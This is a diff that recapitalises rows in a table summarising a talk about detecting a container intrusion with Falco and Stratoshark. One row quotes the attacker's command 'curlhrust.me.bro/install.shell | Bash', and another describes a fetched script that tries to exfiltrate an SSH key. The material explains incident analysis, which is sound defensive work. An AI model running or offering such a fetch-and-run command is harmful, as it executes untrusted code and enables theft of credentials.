@@ -43,12 +43,12 @@ Gerald concludes by encouraging further exploration of both tools and expressing
 |   7 | Demo scenario: Falco detects a shell opened in a container, providing a process ID and name.                                    |
 |   8 | The capture file from Falco can be loaded into Stratoshark for analysis.                                                        |
 |   9 | Stratoshark displays system call names, process names, process IDs, and event details.                                          |
-|  10 | Filtering by process ID isolates system calls related to the suspicious bash process.                                           |
+|  10 | Filtering by process ID isolates system calls related to the suspicious Bash process.                                           |
 |  11 | "Follow falco fd stream" feature reassembles read system calls into a single stream to view user input.                         |
-|  12 | The user input was "curlhrust.me.bro/install.shell \| bash", indicating a potentially malicious action.                         |
-|  13 | Applying a predefined filter shows subprocesses under the bash process, including curl.                                         |
-|  14 | Analysis shows curl performs network activity, writes output to a file descriptor (the pipe), and hands over to bash.           |
-|  15 | Following the pipe stream reveals another bash script that prints "hello" and attempts to exfiltrate an SSH key.                |
+|  12 | The user input was "curlhrust.me.bro/install.shell \| Bash", indicating a potentially malicious action.                         |
+|  13 | Applying a predefined filter shows subprocesses under the Bash process, including cURL.                                         |
+|  14 | Analysis shows cURL performs network activity, writes output to a file descriptor (the pipe), and hands over to Bash.           |
+|  15 | Following the pipe stream reveals another Bash script that prints "hello" and attempts to exfiltrate an SSH key.                |
 |  16 | Stratoshark enables further investigation and drilling down into events.                                                        |
 |  17 | More information is available at falco.org and stratshark.org.                                                                  |
 |  18 | Additional Falco talks are scheduled for tomorrow at 3:15 in the same room.                                                     |
